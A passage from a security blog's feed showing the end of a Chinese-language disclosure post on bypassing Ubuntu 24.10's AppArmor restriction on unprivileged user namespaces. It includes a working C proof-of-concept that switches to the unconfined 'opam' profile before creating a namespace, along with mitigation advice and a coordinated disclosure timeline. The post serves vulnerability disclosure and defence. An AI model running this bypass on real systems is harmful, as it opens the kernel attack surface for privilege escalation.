&lt;p&gt;總結來說，在目前這套機制下，只要套用任意一個處於 unconfined 狀態的 AppArmor 設定檔，就能繞過這些檢查，成功建立非特權使用者命名空間！&lt;/p&gt;

&lt;h2 id=&quot;5-proof-of-concept&quot;&gt;5. Proof-Of-Concept&lt;/h2&gt;

&lt;p&gt;要繞過 Ubuntu 的保護機制，就只需要把程式的 AppArmor 設定檔從預設的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unconfined&lt;/code&gt; 設定檔，換成其他任意一個處於 unconfined 狀態的設定檔即可。這邊我們選擇用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;opam&lt;/code&gt; 這個設定檔，單純只是因為它操作單純、沒有額外的行為。設定檔的內容如下：&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# This profile allows everything and only exists to give the
# application a name instead of having the label &quot;unconfined&quot;

abi &amp;lt;abi/4.0&amp;gt;,
include &amp;lt;tunables/global&amp;gt;

profile opam /usr/bin/opam flags=(unconfined) {
  userns,

  # Site-specific additions and overrides. See local/README for details.
  include if exists &amp;lt;local/opam&amp;gt;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;下方範例程式碼展示了兩種方法，成功在 Ubuntu 24.10 上建立非特權使用者命名空間。測試環境為 Ubuntu 24.10（核心版本 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;6.11.0-14-generic&lt;/code&gt;），測試日期為 2025 年 2 月 17 日。&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#define _GNU_SOURCE
#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;sched.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;fcntl.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;perror_exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;perror&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;unshare_setup&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uid_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gid_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;temp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;edit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{};&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;unshare&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CLONE_NEWNET&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CLONE_NEWUSER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;perror_exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;unshare&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    
    &lt;span class=&quot;n&quot;&gt;temp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/proc/self/setgroups&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;O_WRONLY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;temp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;perror_exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;open /proc/self/setgroups&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    
    &lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;temp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;deny&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;deny&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;temp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    
    &lt;span class=&quot;n&quot;&gt;temp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/proc/self/uid_map&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;O_WRONLY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;temp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;perror_exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;open /proc/self/uid_map&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    
    &lt;span class=&quot;n&quot;&gt;snprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;edit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;edit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;0 %d 1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;temp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;edit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;edit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;temp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;temp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/proc/self/gid_map&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;O_WRONLY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;temp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;perror_exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;open /proc/self/gid_map&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    
    &lt;span class=&quot;n&quot;&gt;snprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;edit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;edit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;0 %d 1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;temp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;edit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;edit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;temp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;profile1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;exec opam&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;profile2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;changeprofile opam&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;func_1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/proc/self/attr/exec&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;O_RDWR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;perror_exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;open /proc/self/attr/exec&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;profile1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;profile1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/usr/bin/unshare&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;-r&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;-n&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;-m&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/bin/bash&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_envp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;execve&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/usr/bin/unshare&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_envp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;func_2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/proc/self/attr/current&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;O_RDWR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;perror_exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;open /proc/self/attr/current&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;profile2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;profile2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;unshare_setup&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getuid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getgid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_envp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;execve&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/bash&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_envp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;func_1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;func_2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;6-mitigation&quot;&gt;6. Mitigation&lt;/h2&gt;

&lt;p&gt;這個繞過方法僅在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/proc/sys/kernel/apparmor_restrict_unprivileged_unconfined&lt;/code&gt; 被關閉（設為 0）時才會生效。而從 Ubuntu 25.04 開始，這個參數預設為啟用狀態，因此不受影響。&lt;/p&gt;

&lt;p&gt;針對 Ubuntu 24.10 及更早版本的使用者，可以參考&lt;a href=&quot;https://discourse.ubuntu.com/t/understanding-apparmor-user-namespace-restriction/58007#p-148026-restrict-unprivileged-unconfined-profile-changes&quot;&gt;官方說明文章&lt;/a&gt;，瞭解如何防止任何非特權且處於 unconfined 狀態的程式執行 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aa-exec&lt;/code&gt; 來切換 AppArmor 設定檔，以避免保護機制遭到繞過。&lt;/p&gt;

&lt;h2 id=&quot;7-disclosure-timeline&quot;&gt;7. Disclosure Timeline&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;2025-02-16：研究員 @roddux 提到 AppArmor 的命名空間限制機制很容易被繞過。&lt;/li&gt;
  &lt;li&gt;2025-02-17：我發現一個繞過方式。&lt;/li&gt;
  &lt;li&gt;2025-02-24：我將此問題回報給 ZDI 團隊。&lt;/li&gt;
  &lt;li&gt;2025-03-21：研究員 @roddux 公開了他的繞過方法。&lt;/li&gt;
  &lt;li&gt;2025-03-27：Qualys 團隊在看到 @roddux 的公開貼文後，也發布了他們的漏洞通報。&lt;/li&gt;
  &lt;li&gt;2025-04-27：ZDI 回覆表示對此類型的漏洞不感興趣，並拒絕後續處理。&lt;/li&gt;
  &lt;li&gt;2025-04-30：我改為將此問題回報給 Ubuntu 安全團隊。&lt;/li&gt;
  &lt;li&gt;2025-05-01：維護者 John 通知我此問題已進入初步審查階段。&lt;/li&gt;
  &lt;li&gt;2025-05-30：John 回覆完整的問題分析與說明。&lt;/li&gt;
  &lt;li&gt;2025-06-26：協作發布文章。&lt;/li&gt;
&lt;/ul&gt;
</description>
                <link>https://devco.re/blog/2025/06/26/the-journey-of-bypassing-ubuntus-unprivileged-namespace-restriction/</link>
                <guid>https://devco.re/blog/2025/06/26/the-journey-of-bypassing-ubuntus-unprivileged-namespace-restriction</guid>
                <pubDate>Thu, 26 Jun 2025 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>The Journey of Bypassing Ubuntu’s Unprivileged Namespace Restriction</title>
                <description>&lt;p&gt;&lt;a href=&quot;/blog/2025/06/26/the-journey-of-bypassing-ubuntus-unprivileged-namespace-restriction-en/&quot;&gt;English Version&lt;/a&gt;, &lt;a href=&quot;/blog/2025/06/26/the-journey-of-bypassing-ubuntus-unprivileged-namespace-restriction/&quot;&gt;中文版本&lt;/a&gt;&lt;/p&gt;

